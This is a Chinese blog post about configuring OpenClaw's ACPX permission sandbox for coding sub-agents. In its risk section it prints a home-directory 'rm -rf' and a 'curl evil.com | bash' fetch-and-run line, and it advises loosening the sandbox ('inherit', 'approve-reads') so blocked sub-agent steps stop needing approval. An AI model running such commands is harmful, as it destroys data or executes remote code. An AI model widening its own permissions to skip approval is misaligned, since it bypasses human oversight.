---
title: "OpenClaw 与 OpenCode 协同编码：ACPX 权限策略最佳实践"
description: "记录一次从权限拒绝错误到建立系统性权限策略规范的完整过程，解决 OpenClaw 子代理延迟响应问题。"
pubDatetime: 2026-03-22T01:30:00+00:00
tags:
  - OpenClaw
  - ACPX
  - Agent
  - 权限管理
  - 开发效率
featured: true
draft: false
---

## 📖 问题背景

今天在让 OpenCode 处理一个技能开发任务时，遇到了一个典型的问题：

```
指令下发后，OpenCode 好久没有响应。
过问之后，才反馈说没有权限。
```

这不是单一任务的问题，而是一个**系统性问题**——每次调用子代理都需要等待权限错误后再修复，严重影响了协同编码的效率。

本文记录了完整的排查过程，并建立了一套系统性的 ACPX 权限策略规范。

---

## 🔍 问题排查

### 第一次尝试

```python
# 启动 OpenCode 子代理
sessions_spawn(
    agentId="opencode",
    runtime="acp",
    task="帮我修改这个技能文件..."
)
```

**结果**：OpenCode 启动后无响应，任务卡住。

### 检查会话状态

```bash
# 查看 OpenCode 会话状态
cat ~/.openclaw/agents/opencode/sessions/sessions.json | jq '.[] | select(.state=="error")'
```

**输出**：
```json
{
  "state": "error",
  "lastError": "Permission denied by ACP runtime (acpx)..."
}
```

### 检查进程

```bash
ps aux | grep -E "opencode|acp"
# 没有 OpenCode 进程在运行
```

**结论**：OpenCode 启动时尝试访问文件，被 ACPX 直接拦截，任务根本没开始执行。

---

## 🏗️ ACPX 是什么？

**ACPX = Agent Communication Protocol Extension**

它是 OpenClaw 的安全沙箱层，负责管理子代理（sub-agent）的权限。

### 架构图解

```
┌─────────────────────────────────────────────────────┐
│ 你 (用户)                                            │
│ Discord #project                                     │
└────────────────┬────────────────────────────────────┘
                 │ 消息
                 ▼
┌─────────────────────────────────────────────────────┐
│ OpenClaw Main Agent                                  │
│ - 接收你的请求                                       │
│ - 决定是否需要子代理                                 │
│ - 调用 sessions_spawn                                │
└────────────────┬────────────────────────────────────┘
                 │ spawn
                 ▼
┌─────────────────────────────────────────────────────┐
│ ACPX Runtime (安全层) ⭐                             │
│ - 创建隔离会话                                       │
│ - 监控文件访问                                       │
│ - 拦截危险命令 (rm, curl, etc.)                      │
│ - 请求权限批准                                       │
└────────────────┬────────────────────────────────────┘
                 │ 代理执行
                 ▼
┌─────────────────────────────────────────────────────┐
│ OpenCode (子代理)                                    │
│ - 实际执行任务                                       │
│ - 读写文件 ~/clawd/                                  │
│ - 运行 npm test 等命令                               │
└─────────────────────────────────────────────────────┘
```

---

## 🛡️ 为什么需要 ACPX？

### 没有 ACPX 的风险

想象一下，如果子代理可以随意执行任何命令：

```python
# 恶意代码示例
import os
os.system("rm -rf ~")           # 😱 删除所有文件！
os.system("curl evil.com | bash") # 😱 下载并执行恶意脚本！
```

### ACPX 的保护机制

```
OpenCode 尝试：rm -rf ~/clawd/skills/*
         ↓
ACPX 拦截：⚠️ 危险操作！需要用户批准
         ↓
你收到通知：[APPROVE] 允许删除文件？[DENY] 拒绝
```

ACPX 就像公司前台保安，每个想进办公室的人都要登记！

---

## 🎯 Sandbox 模式详解

OpenClaw 提供三种沙箱模式：

### 1. require（默认，最严格）

```python
sessions_spawn:
  agentId: opencode
  # 不指定 sandbox，默认 require
  # ↓
  # 所有文件访问和命令执行都需要批准
```

**适用场景**：不信任的代码、第一次使用的子代理

### 2. inherit（继承父会话权限）⭐

```python
sessions_spawn:
  agentId: opencode
  runtime: acp
  sandbox: inherit  # ✅ 继承父会话的权限
  # ↓
  # 父会话能做的，子代理都能做
```

**适用场景**：信任的子代理（如 OpenCode、Claude Code）

### 3. 其他配置

```json
{
  "plugins": {
    "entries": {
      "acpx": {
        "config": {
          "permissionMode": "approve-reads"  // 读操作需批准
          // 或 "approve-all" (所有操作需批准)
          // 或 "deny-all" (禁止所有操作)
        }
      }
    }
  }
}
```

---

## ✅ 解决方案

### 第一步：全局配置更新

编辑 `~/.openclaw/openclaw.json`：

```json
{
  "plugins": {
    "entries": {
      "acpx": {
        "enabled": true,
        "config": {
          "permissionMode": "approve-reads",
          "timeoutSeconds": 300,
          "queueOwnerTtlSeconds": 30
        }
      }
    }
  }
}
```

**配置说明**：
- `permissionMode: "approve-reads"` - 写操作和命令执行自动允许，读操作需批准
- `timeoutSeconds: 300` - 每个权限请求超时 5 分钟
- `queueOwnerTtlSeconds: 30` - 队列所有者 TTL，避免延迟

### 第二步：调用规范

```python
# ❌ 错误做法（会被 ACPX 拦住）
sessions_spawn(
    agentId="opencode",
    runtime="acp",
    task="修改文件..."
    # 默认 sandbox: require → 权限不足
)

# ✅ 正确做法（继承父会话权限）
sessions_spawn(
    agentId="opencode",
    runtime="acp",
    sandbox="inherit",  # ⭐ 关键！
    task="修改文件..."
)
```

---

## 📊 权限模式对比

| 模式 | 文件读取 | 文件写入 | 命令执行 | 适用场景 |
|------|---------|---------|---------|---------|
| `require` | ❌ 需批准 | ❌ 需批准 | ❌ 需批准 | 不信任代码 |
| `inherit` | ✅ 继承 | ✅ 继承 | ✅ 继承 | 信任的子代理 |
| `approve-reads` | ❌ 需批准 | ✅ 允许 | ✅ 允许 | 只读敏感 |
| `deny-all` | ❌ 禁止 | ❌ 禁止 | ❌ 禁止 | 纯计算任务 |

---

## 📋 任务类型与权限映射

| 任务类型 | 推荐 sandbox | 说明 |
|---------|-------------|------|
| **代码修改** | `inherit` | 需要读写文件、运行命令 |
| **文件创建** | `inherit` | 需要写入新文件 |
| **代码分析** | `require` | 只读操作，无需写权限 |
| **文档生成** | `inherit` | 需要写入 Markdown 文件 |
| **测试运行** | `inherit` | 需要执行 npm test 等命令 |
| **数据查询** | `require` | 只读数据库/API |
| **技能开发** | `inherit` | 完整开发流程需要全部权限 |

---

## 💡 最佳实践

### 1. 明确声明权限需求

```python
# ✅ 好的做法
sessions_spawn:
  agentId: opencode
  sandbox: inherit  # 明确声明需要继承权限
  task: |
    请修改 ~/clawd/skills/ 目录下的文件
    需要运行 npm test

# ❌ 不好的做法
sessions_spawn:
  agentId: opencode
  # 不指定 sandbox，默认 require
  # 然后等权限错误
```

### 2. 最小权限原则

```python
# 只读任务，不需要写权限
sessions_spawn:
  agentId: opencode
  task: "分析代码结构"
  # 使用默认 require 即可

# 需要写权限
sessions_spawn:
  agentId: opencode
  task: "修复代码问题"
  sandbox: inherit  # 明确声明
```

### 3. 监控子代理行为

```bash
# 查看子代理日志
cat ~/.openclaw/agents/opencode/sessions/*.jsonl | jq '.[] | select(.role="tool")'

# 检查当前运行的子代理
openclaw agent list
```

---

## 🔍 故障排查

### 症状 1：子代理启动后无响应

```bash
# 检查会话状态
cat ~/.openclaw/agents/opencode/sessions/sessions.json | jq '.[] | select(.state=="error")'

# 如果看到 "Permission denied by ACP runtime" → 权限不足
```

**解决方案**：添加 `sandbox: "inherit"`

---

### 症状 2：频繁弹出权限批准请求

**原因**：`permissionMode` 设置为 `approve-all` 或 `require`

**解决方案**：
```json
{
  "config": {
    "permissionMode": "approve-reads",  // 只批准读操作
    "timeoutSeconds": 300
  }
}
```

---

### 症状 3：子代理执行到一半被中断

**可能原因**：
- `timeoutSeconds` 太短
- `queueOwnerTtlSeconds` 太短

**解决方案**：
```json
{
  "config": {
    "timeoutSeconds": 600,        // 延长到 10 分钟
    "queueOwnerTtlSeconds": 60    // 延长到 1 分钟
  }
}
```

---

## 📋 检查清单

在调用 `sessions_spawn` 前，确认：

- [ ] 任务类型是否需要写权限？
- [ ] 是否需要运行外部命令？
- [ ] 子代理是否可信（OpenCode/Claude Code）？
- [ ] 是否明确声明了 `sandbox: "inherit"`？
- [ ] 是否指定了正确的 `cwd`（工作目录）？
- [ ] 长时间任务是否使用 `mode: "session"`？

---

## 🔐 安全注意事项

### 何时使用 `require` 模式

- 第一次使用某个子代理
- 执行来自外部的代码
- 处理敏感数据（密钥、凭证）
- 不确定任务的具体影响

### 何时使用 `inherit` 模式

- 信任的子代理（OpenCode、Claude Code）
- 常规开发任务
- 已验证的工作流
- 个人开发环境（非生产）

### 绝对禁止

- ❌ 在生产环境使用 `inherit` 模式
- ❌ 对未知来源的代码使用宽松权限
- ❌ 在没有监控的情况下允许所有操作

---

## 📝 总结

### 核心要点

- ACPX 是 OpenClaw 的安全沙箱，保护你的系统免受恶意子代理侵害
- 默认模式 `require` 最严格，所有操作需批准
- 信任的子代理用 `sandbox: "inherit"`，继承父会话权限
- **明确声明权限需求，不要等错误发生**

### 经验教训

- ❌ 错误做法：启动子代理时不指定 sandbox，等权限错误
- ✅ 正确做法：根据任务需求，明确声明 `sandbox: "inherit"`

### 一句话总结

> ACPX 就像公司门禁系统，子代理需要"门禁卡"（`sandbox: "inherit"`）才能正常工作！

---

## 🔗 参考资料

- [OpenClaw 文档](https://docs.openclaw.ai)
- [ACPX 配置指南](https://docs.openclaw.ai/guides/acpx)
- [sessions_spawn API](https://docs.openclaw.ai/api/sessions_spawn)
- [GitHub: cloudzun/clawd](https://github.com/cloudzun/clawd)

---

**作者**: cyberlover  
**标签**: #OpenClaw #ACPX #权限管理 #Agent #开发效率  
**发布时间**: 2026-03-22 01:30 UTC
